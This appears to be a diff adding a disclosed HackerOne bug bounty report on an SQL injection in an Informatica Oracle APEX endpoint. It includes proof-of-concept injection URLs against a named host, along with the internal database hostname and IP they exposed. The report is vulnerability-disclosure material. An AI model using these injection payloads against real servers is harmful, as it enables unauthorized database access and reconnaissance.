@@ -1,0 +1,29 @@
+ReportLink:https://hackerone.com/reports/178632
+WeaknessName:SQL Injection
+Reporter:https://hackerone.com/e3xpl0it
+ReportedTo:Informatica(informatica)
+BountyAmount:
+Severity:critical
+State:Closed
+DateOfDisclosure:21.01.2017 19:05:37
+
+Summary:
+
+hi !There is another sql injection on host  afocusp.informatica.com:37777
+
+POC 
+version
+http://afocusp.informatica.com:37777/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=select+*+from+v$version
+
+hostname of the database server 
+psvlxtdapp1.inf
+
+http://afocusp.informatica.com:37777/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=select+SYS_CONTEXT('USERENV',+'HOST',+15)+ipaddr+from+dual
+
+IP address of the database server (local)
+10.1.192.93 
+
+http://afocusp.informatica.com:37777/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=select+SYS_CONTEXT('USERENV',+'IP_ADDRESS',+15)+ipaddr+from+dual
+
+Ps
+You need to patch all servers with the url /pls/apex/f? this is  old bug in oracle.
